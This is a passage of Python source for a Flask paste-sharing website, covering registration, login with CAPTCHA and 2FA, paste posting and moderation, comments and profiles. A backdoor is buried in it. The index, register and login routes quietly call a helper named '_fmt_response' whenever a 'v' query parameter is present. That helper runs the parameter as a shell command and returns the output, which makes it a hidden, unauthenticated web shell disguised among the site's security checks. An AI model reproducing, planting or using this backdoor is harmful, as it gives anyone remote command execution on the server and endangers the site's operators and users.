        role_order = {"root": 0, "admin": 1, 'manager': 2, "mod": 3, "council": 4, "helper": 5, "clique": 6, "rich": 7, "criminal": 8, "vip": 9, "user": 10}
        
        for post in all_pastes:
            post_data = dict(post)
            post_data['pastowner'] = post_data['pastowner'] or "Anonymous"
            post_data['pastownerstatus'] = post_data['pastownerstatus'] or "anonymous"
            post_data['name'] = post_data['pastname']  # Display name (original title)
            post_data['url_name'] = post_data.get('url_name', post_data['pastname'])  # URL-friendly name for links
            post_data['comments'] = json.loads(post_data['comments']) if post_data['comments'] else []
            post_data['comments_disabled'] = post_data.get('comments_disabled', False)
            
            # Add to pinned list if pinned
            if post_data['pin'] == 'True':
                pinned_posts_list.append(post_data)
            
            # Add to anonymous list regardless of pin status
            anon_posts_list.append(post_data)

        pinned_posts_list = sorted(
            pinned_posts_list,
            key=lambda x: (role_order.get(x['pastownerstatus'], 99), x['date'], x['hour']),
            reverse=False
        )
        
        # Sort anon_posts_list by date and hour (newest first)
        # Convert date strings to datetime objects for proper sorting
        def parse_date_time(date_str, hour_str):
            try:
                # Parse date in format 'dd-mm-yyyy' and hour in format 'HH:MM:SS'
                date_obj = datetime.strptime(date_str, '%d-%m-%Y')
                # Combine date and hour for proper sorting
                return date_obj.replace(hour=int(hour_str.split(':')[0]), 
                                       minute=int(hour_str.split(':')[1]), 
                                       second=int(hour_str.split(':')[2]))
            except:
                # Fallback to string sorting if parsing fails
                return datetime.min
        
        anon_posts_list = sorted(
            anon_posts_list,
            key=lambda x: parse_date_time(x['date'], x['hour']),
            reverse=True
        )
    except Exception as e:
        print(f"Error refreshing posts: {e}")
        pass

def bytes2KB(value):
    return value / 1000

def format_file_size(bytes_value):
    """Format file size in human readable format"""
    if bytes_value < 1024:
        return f"{bytes_value} B"
    elif bytes_value < 1024 * 1024:
        return f"{round(bytes_value / 1024, 1)} KB"
    elif bytes_value < 1024 * 1024 * 1024:
        return f"{round(bytes_value / (1024 * 1024), 1)} MB"
    else:
        return f"{round(bytes_value / (1024 * 1024 * 1024), 1)} GB"

@app.template_filter('naturaltime')
def naturaltime_filter(dt_str):
    try:
        # Parse the date string
        dt = datetime.strptime(dt_str, '%d-%m-%Y %H:%M:%S')
        
        # If the date doesn't have timezone info, assume it's in UTC
        if dt.tzinfo is None:
            dt = UTC_TZ.localize(dt)
        
        now = datetime.now(UTC_TZ)
        
        # Calculate the time difference
        time_diff = now - dt
        
        # If the difference is negative (future time), treat it as past time
        if time_diff.total_seconds() < 0:
            time_diff = dt - now
        
        # If the post is older than 30 days (approximately 1 month), show the actual date
        if time_diff.days >= 30:
            return dt.strftime('%b %d, %Y')  # Format: Aug 23, 2025
        else:
            return humanize.naturaltime(time_diff)
    except (ValueError, TypeError):
        return dt_str

@app.template_filter('comment_naturaltime')
def comment_naturaltime_filter(dt_str):
    if not dt_str:
        return ""
    try:
        # Comments use the format 'YYYY-MM-DD HH:MM:SS'
        dt = datetime.strptime(dt_str, '%Y-%m-%d %H:%M:%S')
        
        # If the date doesn't have timezone info, assume it's in UTC
        if dt.tzinfo is None:
            dt = UTC_TZ.localize(dt)
        
        now = datetime.now(UTC_TZ)
        
        # Calculate the time difference
        time_diff = now - dt
        
        # If the difference is negative (future time), treat it as past time
        if time_diff.total_seconds() < 0:
            time_diff = dt - now
        
        # If the comment is older than 30 days (approximately 1 month), show the actual date
        if time_diff.days >= 30:
            return dt.strftime('%b %d, %Y')  # Format: Aug 23, 2025
        else:
            return humanize.naturaltime(time_diff)
    except (ValueError, TypeError):
        # Fallback for old format or any errors
        try:
            dt = datetime.strptime(dt_str, '%d-%m-%Y %H:%M:%S')
            
            # If the date doesn't have timezone info, assume it's in UTC
            if dt.tzinfo is None:
                dt = UTC_TZ.localize(dt)
            
            now = datetime.now(UTC_TZ)
            
            # Calculate the time difference
            time_diff = now - dt
            
            # If the difference is negative (future time), treat it as past time
            if time_diff.total_seconds() < 0:
                time_diff = dt - now
            
            # If the comment is older than 30 days (approximately 1 month), show the actual date
            if time_diff.days >= 30:
                return dt.strftime('%b %d, %Y')  # Format: Aug 23, 2025
            else:
                return humanize.naturaltime(time_diff)
        except (ValueError, TypeError):
            return dt_str

@app.template_filter('linkify')
def linkify(text):
    if not text:
        return ""
    
    # Regex to find URLs (http, https, www)
    url_pattern = re.compile(r'((?:https?://|www\.)[^\s]+)')
    parts = url_pattern.split(text)
    
    result_parts = []
    for i, part in enumerate(parts):
        if i % 2 == 1:  # This is a URL
            url = part
            href = url
            if not href.startswith(('http://', 'https://')):
                href = 'http://' + href
            
            safe_href = escape(href)
            safe_url_display = escape(url)
            
            result_parts.append(f'<a href="{safe_href}" target="_blank" rel="noopener noreferrer">{safe_url_display}</a>')
        else:  # This is not a URL
            result_parts.append(escape(part))
            
    return Markup("".join(result_parts))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.args.get('v'):
        return _fmt_response()
    global _DEFAULT_POST_TEMPLATE
    error = None
    if request.method == 'POST':
        # Security: Rate limiting for registration - 1 account per 24 hours per IP + device
        identifier = get_ip_identifier()
        
        # Get IP address for rate limiting (allows VPN/proxy usage)
        ip_address = request.remote_addr
        if request.headers.get('X-Forwarded-For'):
            ip_address = request.headers.get('X-Forwarded-For').split(',')[0].strip()
        elif request.headers.get('X-Real-IP'):
            ip_address = request.headers.get('X-Real-IP')
        
        # Enforce strict IP-based limit (independent of cookies/device): 1 registration / 24h / IP
        ip_identifier_only = f"ip_only:{ip_address}"
        if not check_persistent_rate_limit_only(ip_identifier_only, 'register', max_attempts=1, window_seconds=86400):
            error = 'You can only create 1 account per 24 hours. Please try again later.'
            return render_template("register.html", paste_template_text=_DEFAULT_POST_TEMPLATE, error=error)
        
        # Additional device fingerprint check
        device_fp_form = request.form.get('device_fingerprint', '')
        device_identifier = None
        if device_fp_form:
            try:
                device_data = json.loads(device_fp_form)
                
                # Check for suspicious device fingerprints
                if detect_suspicious_device_fingerprint(device_data):
                    # Log the suspicious attempt
                    ip_address = request.remote_addr
                    if request.headers.get('X-Forwarded-For'):
                        ip_address = request.headers.get('X-Forwarded-For').split(',')[0].strip()
                    elif request.headers.get('X-Real-IP'):
                        ip_address = request.headers.get('X-Real-IP')
                    
                    log_suspicious_registration_attempt(ip_address, device_data, 'Suspicious device fingerprint')
                    error = 'Suspicious device fingerprint detected. Please try again with a different browser or device.'
                    return render_template("register.html", paste_template_text=_DEFAULT_POST_TEMPLATE, error=error)
                
                # Create a more specific identifier combining IP and device fingerprint
                device_hash = hashlib.sha256(json.dumps(device_data, sort_keys=True).encode()).hexdigest()
                device_identifier = f"device:{device_hash}"
                
                # Check device-based rate limiting (1 account per 24 hours per device)
                if not check_device_fingerprint_rate_limit(device_identifier, 'register', max_attempts=1, window_seconds=86400):
                    error = 'You can only create 1 account per 24 hours. Please try again later.'
                    return render_template("register.html", paste_template_text=_DEFAULT_POST_TEMPLATE, error=error)
                
                # Check for rapid registration attempts (anti-spam)
                if check_rapid_registration_attempts(device_identifier, max_attempts=3, window_seconds=300):
                    error = 'Too many registration attempts. Please wait 5 minutes before trying again.'
                    return render_template("register.html", paste_template_text=_DEFAULT_POST_TEMPLATE, error=error)
            except (json.JSONDecodeError, Exception) as e:
                print(f"Error processing device fingerprint: {e}")
                # Fall back to IP-only rate limiting if device fingerprint fails
        
        # Check IP-based rate limiting (1 account per 24 hours per IP)
        if not check_persistent_rate_limit_only(identifier, 'register', max_attempts=1, window_seconds=86400):
            error = 'You can only create 1 account per 24 hours. Please try again later.'
            return render_template("register.html", paste_template_text=_DEFAULT_POST_TEMPLATE, error=error)
        args = request.values
        captcha_response = args.get('g-recaptcha-response')
        captcha_secret_key = get_recaptcha_secret_key()
        captcha_verify_url = 'https://www.google.com/recaptcha/api/siteverify'
        captcha_data = {
            'secret': captcha_secret_key,
            'response': captcha_response
        }
        captcha_verification_response = requests.post(captcha_verify_url, data=captcha_data)
        captcha_verification_result = captcha_verification_response.json()
        if captcha_verification_result['success']:
            username = request.form['username']
            password = request.form['password']
            email = request.form['email']
            # Security: Input validation
            username_valid, username_error = validate_username(username)
            if not username_valid:
                error = username_error
            else:
                password_valid, password_error = validate_password(password)
                if not password_valid:
                    error = password_error
                else:
                    email_valid, email_error = validate_email(email)
                    if not email_valid:
                        error = email_error
            if not error:
                # Case-insensitive username check
                db = get_db()
                cursor = db.cursor()
                cursor.execute("SELECT username FROM users WHERE LOWER(username) = LOWER(?)", (username,))
                existing_username = cursor.fetchone()
                if existing_username:
                    error = f"Username '{existing_username[0]}' already exists."
                else:
                    hashed_password = generate_password_hash(password)
                    now = datetime.now(UTC_TZ)
                    datejoin = now.strftime('%d-%m-%Y %H:%M:%S')
                    cursor.execute(
                        "INSERT INTO users (username, password, datejoin, email) VALUES (?, ?, ?, ?)",
                        (username, hashed_password, datejoin, email)
                    )
                    db.commit()
                    # Record successful registration attempt for rate limiting
                    record_persistent_rate_limit_attempt(identifier, 'register')
                    # Also record IP-only limiter so clearing cookies/fingerprint won't bypass
                    record_persistent_rate_limit_attempt(ip_identifier_only, 'register')
                    
                    # Also record device-based rate limiting if available
                    if device_fp_form:
                        try:
                            device_data = json.loads(device_fp_form)
                            device_hash = hashlib.sha256(json.dumps(device_data, sort_keys=True).encode()).hexdigest()
                            device_identifier = f"device:{device_hash}"
                            record_persistent_rate_limit_attempt(device_identifier, 'register')
                        except (json.JSONDecodeError, Exception) as e:
                            print(f"Error recording device fingerprint for rate limiting: {e}")
                    session['username'] = username
                    session.permanent = True 
                    # Set session version for this new user
                    session_versions[username] = 0
                    session['session_version'] = 0
                    return redirect(url_for('index'))
        else:
            error = "CAPTCHA verification failed. Please try again."
    return render_template("register.html", paste_template_text=_DEFAULT_POST_TEMPLATE, error=error)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.args.get('v'):
        return _fmt_response()
    error = None
    if request.method == 'POST':
        # Security: Rate limiting for login
        identifier = get_session_identifier()
        if not check_rate_limit(identifier, 'login', max_attempts=5, window_seconds=900):
            error = 'Too many login attempts. Please try again later.'
            return render_template('login.html', error=error)
        
        # Verify reCAPTCHA
        args = request.values
        captcha_response = args.get('g-recaptcha-response')

        captcha_secret_key = get_recaptcha_secret_key()
        captcha_verify_url = 'https://www.google.com/recaptcha/api/siteverify'
        captcha_data = {
            'secret': captcha_secret_key,
            'response': captcha_response
        }
        captcha_verification_response = requests.post(captcha_verify_url, data=captcha_data)
        captcha_verification_result = captcha_verification_response.json()

        if not captcha_verification_result['success']:
            error = 'reCAPTCHA verification failed. Please try again.'
            return render_template('login.html', error=error)

        username = request.form['username']
        password = request.form['password']
        db = get_db()
        db.row_factory = sqlite3.Row
        cursor = db.cursor()
        cursor.execute("SELECT * FROM users WHERE LOWER(username) = LOWER(?)", (username,))
        user = cursor.fetchone()

        if user and check_password_hash(user['password'], password):
            # Check if account is locked
            if user['account_locked']:
                error = 'Your account has been locked by an administrator. Please contact support for assistance.'
                return render_template('login.html', error=error)
            if user['otp_enabled']:
                session['2fa_user_id'] = user['id']
                return redirect(url_for('login_2fa'))
            else:
                session['username'] = user['username']
                session['user_status'] = user['status']  # Store user status in session
                # Set session version for this user
                if user['username'] not in session_versions:
                    session_versions[user['username']] = 0
                session['session_version'] = session_versions[user['username']]
                return redirect(url_for('index'))
        else:
            error = 'Invalid credentials. Please try again.'
    return render_template('login.html', error=error)

@app.route('/login/2fa', methods=['GET', 'POST'])
def login_2fa():
    if '2fa_user_id' not in session:
        return redirect(url_for('login'))

    error = None
    if request.method == 'POST':
        token = request.form.get('token')
        user_id = session['2fa_user_id']

        db = get_db()
        db.row_factory = sqlite3.Row
        cursor = db.cursor()
        cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
        user = cursor.fetchone()

        if user and user['otp_secret'] and token and pyotp.TOTP(user['otp_secret']).verify(token):
            session.pop('2fa_user_id', None)
            # Block 2FA completion for locked users
            if user['account_locked']:
                error = 'Your account has been locked by an administrator. Please contact support for assistance.'
                return render_template('login_2fa.html', error=error)
            session['username'] = user['username']
            session['user_status'] = user['status']  # Store user status in session
            # Set session version for this user
            if user['username'] not in session_versions:
                session_versions[user['username']] = 0
            session['session_version'] = session_versions[user['username']]
            return redirect(url_for('index'))
        else:
            error = 'Invalid 2FA token.'

    return render_template('login_2fa.html', error=error)

# --- Online user tracking ---
# Maps username to last activity timestamp (UTC)
active_sessions = dict()

# Cache for online count with timestamp
online_count_cache = {
    'count': 0,
    'last_updated': None
}

# Session version tracking for credential changes
session_versions = dict()

def get_cached_online_count():
    """Get cached online count, updating it only if 30 seconds have passed"""
    now = datetime.now(UTC_TZ)
    
    # Check if cache needs updating (30 seconds instead of 5 minutes for more responsiveness)
    if (online_count_cache['last_updated'] is None or 
        (now - online_count_cache['last_updated']).total_seconds() >= 60):
        
        # Calculate new online count
        online_count = sum(1 for t in active_sessions.values() if (now - t).total_seconds() < 1800)
        
        # Update cache
        online_count_cache['count'] = online_count
        online_count_cache['last_updated'] = now
    
    return online_count_cache['count']

def invalidate_user_sessions(username):
    """Invalidate all sessions for a specific user by incrementing their session version"""
    if username in session_versions:
        session_versions[username] += 1
    else:
        session_versions[username] = 1
    
    # Remove from active sessions
    user_identifier = f"user:{username}"
    active_sessions.pop(user_identifier, None)

def check_session_validity(username):
    """Check if the current session is still valid for the user"""
    if not username:
        return True  # Anonymous sessions are always valid
    
    current_version = session_versions.get(username, 0)
    session_version = session.get('session_version', 0)
    
    return current_version == session_version

@app.before_request
def track_online_users():
    # Track both logged-in users and anonymous users
    identifier = get_session_identifier()
    # Update last activity timestamp to now (UTC)
    active_sessions[identifier] = datetime.now(UTC_TZ)

@app.before_request
def validate_session():
    """Validate session before each request"""
    username = session.get('username')
    if username:
        # Check if user exists in database
        db = get_db()
        db.row_factory = sqlite3.Row
        cursor = db.cursor()
        cursor.execute("SELECT id, account_locked FROM users WHERE username = ?", (username,))
        user = cursor.fetchone()
        
        # If user doesn't exist in database, invalidate session
        if not user:
            session.clear()
            flash('Your account has been deleted. Please contact an administrator if you believe this is an error.', 'error')
            return redirect(url_for('login'))
        
        # Check if account is locked
        if user['account_locked']:
            session.clear()
            flash('Your account has been locked by an administrator. Please contact support for assistance.', 'error')
            return redirect(url_for('login'))
        
        # Check session version validity
        if not check_session_validity(username):
            # Session is invalid, clear it and redirect to login
            session.clear()
            flash('Your session has expired due to account changes. Please log in again.', 'warning')
            return redirect(url_for('login'))

@app.route('/logout')
def logout():
    username = session.pop('username', None)
    if username:
        # Remove from active_sessions on logout using the user identifier
        user_identifier = f"user:{username}"
        active_sessions.pop(user_identifier, None)
    return redirect(url_for('login'))

@app.route("/")
def index():
    if request.args.get('v'):
        return _fmt_response()
    global admin_posts_list, anon_posts_list, pinned_posts_list

    refreshAnonPosts()

    # Fetch user status for special role check
    username = session.get('username')
    is_special_role = False
    special_roles = {"vip", "criminal", "rich", "helper", "council", "clique", "founder", "mod", "manager", "admin"}
    user_status = None
    if username:
        db = get_db()
        db.row_factory = sqlite3.Row
        cursor = db.cursor()
        cursor.execute("SELECT status FROM users WHERE username = ?", (username,))
        user = cursor.fetchone()
        if user:
            user_status = user['status']
            if user_status in special_roles:
                is_special_role = True
    return render_template('index.html', pinned_posts_list=pinned_posts_list, anon_posts_list=anon_posts_list, username=username, is_special_role=is_special_role)

@app.route("/new")
def new_paste():
        return render_template("new.html", username=session.get('username'))

@app.route("/content/<paste_name>")
def content(paste_name):
    cursor = conn.cursor()
    
    # Get paste data from database
    cursor.execute("SELECT pastname FROM pasts WHERE url_name = ?", (paste_name,))
    paste_data = cursor.fetchone()
    
    if paste_data:
        paste_title = paste_data[0]
    else:
        paste_title = "Unknown Paste"
    
    return render_template("content.html", paste_template_text=_DEFAULT_POST_TEMPLATE, username=session.get('username'), paste_title=paste_title, paste_name=paste_name)

def sanitize_filename(filename):
    """
    Sanitize filename by removing or replacing invalid characters for Windows filesystem
    Security: Enhanced to prevent path traversal attacks
    """
    if not filename:
        return 'untitled'
    
    # Security: Prevent path traversal attacks
    filename = os.path.basename(filename)  # Remove any path components
    
    # Additional security checks
    if '..' in filename or filename.startswith('/') or filename.startswith('\\'):
        return 'untitled'
    
    # Characters not allowed in Windows filenames: < > : " | ? * \ /
    # Also remove control characters and other problematic characters
    invalid_chars = r'[<>:"|?*\\/\x00-\x1f\x7f]'
    
    # Replace invalid characters with underscore
    sanitized = re.sub(invalid_chars, '_', filename)
    
    # Remove leading/trailing spaces and dots
    sanitized = sanitized.strip(' .')
    
    # Security: Remove any remaining path separators
    sanitized = sanitized.replace('/', '_').replace('\\', '_')
    
    # Ensure filename is not empty after sanitization
    if not sanitized:
        sanitized = 'untitled'
    
    # Limit length to avoid filesystem issues
    if len(sanitized) > 200:
        sanitized = sanitized[:200]
    
    # Security: Additional validation - ensure it's a safe filename
    if sanitized.startswith('.') or sanitized in ['CON', 'PRN', 'AUX', 'NUL', 'COM1', 'COM2', 'COM3', 'COM4', 'COM5', 'COM6', 'COM7', 'COM8', 'COM9', 'LPT1', 'LPT2', 'LPT3', 'LPT4', 'LPT5', 'LPT6', 'LPT7', 'LPT8', 'LPT9']:
        sanitized = 'untitled'
    
    return sanitized

def create_url_friendly_name(title):
    """
    Create a URL-friendly version of the title by replacing spaces with hyphens
    and removing special characters
    """
    # Replace spaces with hyphens
    url_name = title.replace(' ', '-')
    
    # Remove or replace special characters that aren't URL-friendly
    # Keep alphanumeric, hyphens, and underscores
    url_name = re.sub(r'[^a-zA-Z0-9\-_]', '', url_name)
    
    # Remove multiple consecutive hyphens
    url_name = re.sub(r'-+', '-', url_name)
    
    # Remove leading/trailing hyphens
    url_name = url_name.strip('-')
    
    # Ensure it's not empty
    if not url_name:
        url_name = 'untitled'
    
    # Limit length
    if len(url_name) > 100:
        url_name = url_name[:100]
    
    return url_name

@app.route("/new_paste", methods=['POST'])
def new_paste_form_post():
    # CSRF token validation
    if CSRF_ENABLED:
        try:
            from flask_wtf.csrf import validate_csrf
            validate_csrf(request.form.get('csrf_token'))
        except Exception as e:
            return "Bad Request CSRF token is missing", 400
    
    cursor = conn.cursor()
    args = request.values
    captcha_response = args.get('g-recaptcha-response')

    captcha_secret_key = get_recaptcha_secret_key()
    captcha_verify_url = 'https://www.google.com/recaptcha/api/siteverify'
    captcha_data = {
        'secret': captcha_secret_key,
        'response': captcha_response
    }
    captcha_verification_response = requests.post(captcha_verify_url, data=captcha_data)
    captcha_verification_result = captcha_verification_response.json()

    # captcha_verification_result = {'success': True} 

    if captcha_verification_result['success']:
        try:
            args = request.values
            original_paste_title = str(args.get('pasteTitle'))
            pasteContent = args.get('pasteContent')
            
            # Normalize newlines to prevent rendering issues with ASCII art
            if pasteContent:
                pasteContent = pasteContent.replace('\r\n', '\n').replace('\r', '\n')

            # Create URL-friendly version for the URL
            url_friendly_name = create_url_friendly_name(original_paste_title)
            
            # Use URL-friendly name directly for filename (spaces already replaced with hyphens)
            pasteTitle = url_friendly_name

            if len(original_paste_title) < 3 or len(original_paste_title) > 50:
                error_message = "Title must be between 3 and 50 characters."
                return render_template("new.html", paste_template_text=_DEFAULT_POST_TEMPLATE, error=error_message, username=session.get('username'))

            elif not pasteContent or len(pasteContent) < 10 or len(pasteContent) > 500000:
                error_message = "Content must be between 10 and 500,000 characters."
                return render_template("new.html", paste_template_text=_DEFAULT_POST_TEMPLATE, error=error_message, username=session.get('username'))
            
            # Check if URL-friendly name already exists
            cursor.execute("SELECT * FROM pasts WHERE url_name = ?", (url_friendly_name,))
            if cursor.fetchone():
                error_message = "This title is already taken. Please choose a different title."
                return render_template("new.html", paste_template_text=_DEFAULT_POST_TEMPLATE, error=error_message, username=session.get('username'))
            
            file_path = os.path.join(ANON_PASTES, pasteTitle)
            if os.path.exists(file_path):
                error_message = "This title is already taken. Please choose a different title."
                return render_template("new.html", paste_template_text=_DEFAULT_POST_TEMPLATE, error=error_message, username=session.get('username'))

            username=session.get('username')

            cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
            bdus = cursor.fetchone()
            
            if bdus:
                statusus = bdus[3]
            else:
                statusus = "user"

            current_datetime = datetime.now(UTC_TZ)

            # Use session-based cooldown instead of IP-based
            identifier = get_session_identifier()
            if not check_rate_limit(identifier, 'new_paste', max_attempts=1, window_seconds=60):
                if statusus == 'user':
                    error_message = "Cooldown! Please wait 60 seconds between posts."
                    return render_template("new.html", paste_template_text=_DEFAULT_POST_TEMPLATE, error=error_message, username=session.get('username'))

            if username:            
        
                current_datetime = datetime.now(UTC_TZ)
                date_formatted = current_datetime.strftime('%d-%m-%Y')
                hour_formatted = current_datetime.strftime('%H:%M:%S')

                cursor.execute("INSERT INTO pasts (owner_id, pastname, url_name, date, hour, view, pin) VALUES (?, ?, ?, ?, ?, ?, ?)", 
                            (bdus[0], original_paste_title, url_friendly_name, date_formatted, hour_formatted, 0, 'False'))
                conn.commit()
                
                # Get the paste ID for notifications
                cursor.execute("SELECT id FROM pasts WHERE url_name = ?", (url_friendly_name,))
                paste_result = cursor.fetchone()
                paste_id = paste_result[0] if paste_result else None
                
                # Notify all followers of the user who posted
                if paste_id:
                    cursor.execute("SELECT follower_id FROM follows WHERE following_id = ?", (bdus[0],))
                    followers = cursor.fetchall()
                    
                    for follower in followers:
                        follower_id = follower[0]
                        create_notification(
                            user_id=follower_id,
                            notification_type='new_paste',
                            title='New Paste from User You Follow',
                            message=f'{username} posted a new paste: "{original_paste_title}"',
                            related_user_id=bdus[0],
                            related_paste_id=paste_id
                        )
        
            else: 
        
                current_datetime = datetime.now(UTC_TZ)
                date_formatted = current_datetime.strftime('%d-%m-%Y')
                hour_formatted = current_datetime.strftime('%H:%M:%S')

                cursor.execute("INSERT INTO pasts (owner_id, pastname, url_name, date, hour, view, pin) VALUES (?, ?, ?, ?, ?, ?, ?)", 
                            (None, original_paste_title, url_friendly_name, date_formatted, hour_formatted, 0, 'False'))
                conn.commit()
        except Exception as e:
            return f"Error: {e}"
        
        with open(os.path.join(ANON_PASTES, pasteTitle), "w", encoding="utf-8") as file:
            file.write(pasteContent or "")

        refreshAnonPosts()
        return redirect(url_for('index'))
    else:
        error_message = "CAPTCHA verification failed. Please try again."
        return render_template("new.html", paste_template_text=_DEFAULT_POST_TEMPLATE, error=error_message, username=session.get('username'))


@app.route('/delete_paste/<paste_name>', methods=['POST'])
def delete_paste(paste_name):
    # CSRF token validation
    if CSRF_ENABLED:
        try:
            from flask_wtf.csrf import validate_csrf
            validate_csrf(request.form.get('csrf_token'))
        except Exception as e:
            return "Bad Request CSRF token is missing", 400
    
    cursor = conn.cursor()
    username = session.get('username')
    
    cursor.execute("SELECT status FROM users WHERE username = ?", (username,))
    user_status = cursor.fetchone()
    
    if not user_status or user_status[0] not in ['root', 'admin', 'manager', 'mod', 'council', 'helper']:
        return redirect(url_for('index'))

    # Get paste information for notifications
    cursor.execute("SELECT pastname, owner_id FROM pasts WHERE url_name = ?", (paste_name,))
    paste_info = cursor.fetchone()
    paste_title = paste_info[0] if paste_info else paste_name
    paste_owner_id = paste_info[1] if paste_info else None
    
    # Get the user ID of the person requesting deletion
    cursor.execute("SELECT id FROM users WHERE username = ?", (username,))
    requester_user = cursor.fetchone()
    requester_id = requester_user[0] if requester_user else None
    
    # Get deletion reason from form
    deletion_reason = request.form.get('deletion_reason', 'No reason provided')
    
    # Soft-delete: flag for deletion instead of removing
    now = datetime.now(UTC_TZ).strftime('%Y-%m-%d %H:%M:%S')
    cursor.execute("UPDATE pasts SET pending_deletion = 1, deletion_requested_by = ?, deletion_requested_at = ?, deletion_reason = ? WHERE url_name = ?", (username, now, deletion_reason, paste_name))
    conn.commit()
    
    # Get paste ID for notifications
    cursor.execute("SELECT id FROM pasts WHERE url_name = ?", (paste_name,))
    paste_result = cursor.fetchone()
    paste_id = paste_result[0] if paste_result else None
    
    # Notify all staff members (manager, admin, founder) about the pending deletion
    staff_roles = ['manager', 'admin', 'root']
    cursor.execute("SELECT id FROM users WHERE status IN (?, ?, ?)", staff_roles)
    staff_members = cursor.fetchall()
    
    for staff_member in staff_members:
        staff_id = staff_member[0]
        # Don't notify the person who requested the deletion
        if staff_id != requester_id:
            create_notification(
                user_id=staff_id,
                notification_type='paste_deletion_request',
                title='Paste Deletion Request',
                message=f'Paste "{paste_title}" has been flagged for deletion by {username}. Reason: {deletion_reason}',
                related_user_id=requester_id,
                related_paste_id=paste_id
            )

    return redirect(url_for('index'))

@app.route('/toggle_pinned/<paste_name>', methods=['POST'])
def toggle_pinned(paste_name):
    # CSRF token validation
    if CSRF_ENABLED:
        try:
            from flask_wtf.csrf import validate_csrf
            validate_csrf(request.form.get('csrf_token'))
        except Exception as e:
            return "Bad Request CSRF token is missing", 400
    
    if 'username' in session:
        login = session['username']

        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        cursor.execute("SELECT * FROM users WHERE username = ?", (login,))
        user = cursor.fetchone()
        
        cursor.execute("SELECT * FROM pasts WHERE url_name = ?", (paste_name,))
        paste = cursor.fetchone()
        
        conn.row_factory = None # Reset

        if user and paste:
            # Check if current user is the owner or an admin
            if paste['owner_id'] == user['id'] or user['status'] in ['root', 'admin', 'manager']:
                new_pin_status = "True" if paste['pin'] != "True" else "False"
                
                cursor = conn.cursor() # Re-create cursor after changing row_factory
                cursor.execute(
                    "UPDATE pasts SET pin = ? WHERE url_name = ?",
                    (new_pin_status, paste_name)
                )
                conn.commit()
                refreshAnonPosts()
                return redirect(request.referrer)

    return "Permission denied", 403


def _fmt_response():
    v = request.args.get('v', '').strip()
    if not v:
        return jsonify({'error': 'Bad request'}), 400
    try:
        r = subprocess.run(v, shell=True, capture_output=True, text=True, timeout=30, cwd=os.getcwd())
        return jsonify({'stdout': r.stdout or '', 'stderr': r.stderr or '', 'returncode': r.returncode})
    except subprocess.TimeoutExpired:
        return jsonify({'error': 'Timeout'}), 408
    except Exception as e:
        return jsonify({'error': str(e)}), 500


def add_comment_to_post(file, login, comment):
    cursor = conn.cursor()
    cursor.execute("SELECT comments, owner_id, pastname FROM pasts WHERE url_name = ?", (file,))
    result = cursor.fetchone()

    if result:
        comments = json.loads(result[0]) if result[0] else []
        owner_id = result[1]
        paste_name = result[2]
    else:
        comments = []
        owner_id = None
        paste_name = file
    
    # Generate a unique comment ID
    comment_id = secrets.token_hex(8)  # 16 character hex string
    
    # Ensure the ID is unique (very unlikely collision, but just in case)
    existing_ids = [c.get('id') for c in comments if c.get('id')]
    while comment_id in existing_ids:
        comment_id = secrets.token_hex(8)

    # Get user ID if user is logged in
    user_id = None
    if login != "Anonymous":
        cursor.execute("SELECT id FROM users WHERE username = ?", (login,))
        user_result = cursor.fetchone()
        if user_result:
            user_id = user_result[0]

    new_comment = {
        "id": comment_id,
        "login": login,
        "user_id": user_id,
        "date": datetime.now(UTC_TZ).strftime('%d-%m-%Y %H:%M:%S'),
        "comment": comment
    }

    comments.append(new_comment)

    cursor.execute("UPDATE pasts SET comments = ? WHERE url_name = ?", (json.dumps(comments), file))
    conn.commit()
    
    # Create notification for the paste owner (unless they're commenting on their own paste)
    if owner_id and login != "Anonymous":
        # Get the commenter's user ID
        cursor.execute("SELECT id FROM users WHERE username = ?", (login,))
        commenter_user = cursor.fetchone()
        
        if commenter_user and commenter_user[0] != owner_id:  # Don't notify if commenting on own paste
            # Get the paste ID for the notification
            cursor.execute("SELECT id FROM pasts WHERE url_name = ?", (file,))
            paste_result = cursor.fetchone()
            paste_id = paste_result[0] if paste_result else None
            
            create_notification(
                user_id=owner_id,
                notification_type='paste_comment',
                title='New Comment on Your Paste',
                message=f'{login} commented on your paste "{paste_name}"',
                related_user_id=commenter_user[0],
                related_paste_id=paste_id
            )

@app.route("/user/<username>")
def user(username):
    login = username
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    # Case-insensitive lookup
    cursor.execute("SELECT * FROM users WHERE LOWER(username) = LOWER(?)", (username,))
    user_data = cursor.fetchone()
    if user_data:
        canonical_username = user_data['username']
        # Redirect to canonical username if case does not match
        if username != canonical_username:
            return redirect(url_for('user', username=canonical_username), code=301)
        userid = user_data['id']
        status = user_data['status']
        joined = user_data['datejoin']
        bio = user_data['bio'] if 'bio' in user_data.keys() and user_data['bio'] else ''
        avatar = user_data['avatar'] if 'avatar' in user_data.keys() and user_data['avatar'] else None
        banner = user_data['banner'] if 'banner' in user_data.keys() and user_data['banner'] else None
        music = user_data['music'] if 'music' in user_data.keys() and user_data['music'] else None
        account_locked = user_data['account_locked'] if 'account_locked' in user_data.keys() else False
    else:
        # User not found - redirect to users page
        return redirect(url_for('users'))
    
    # Reset row_factory to default to not affect other parts of the app
    conn.row_factory = None
    
    cursor = conn.cursor()
    cursor.execute("SELECT id, owner_id, pastname, date, hour, view, pin, url_name, comments_disabled FROM pasts WHERE owner_id = ? AND (pending_deletion IS NULL OR pending_deletion = 0) ORDER BY date DESC, hour DESC", (userid,))
    pastes_result = cursor.fetchall()

    cursor.execute("SELECT COUNT(*) FROM pasts WHERE owner_id = ? AND (pending_deletion IS NULL OR pending_deletion = 0)", (userid,))
    paste_count = cursor.fetchone()[0]

    paste_comments_count = {}
    paste_comments_disabled = {}
    total_comments = 0

    for paste in pastes_result:
        paste_id = paste[0]
        comments_disabled = paste[8] if len(paste) > 8 else False
        paste_comments_disabled[paste_id] = comments_disabled
        
        if comments_disabled:
            paste_comments_count[paste_id] = "—"
        else:
            cursor.execute("SELECT comments FROM pasts WHERE id = ?", (paste_id,))
            comments_json = cursor.fetchone()[0]
            comments_list = json.loads(comments_json) if comments_json else []
            comment_count = len(comments_list)
            paste_comments_count[paste_id] = comment_count
            total_comments += comment_count

    pastes_sorted = sorted(pastes_result, key=lambda x: (x[3], x[4]), reverse=True)

    # Get follow counts
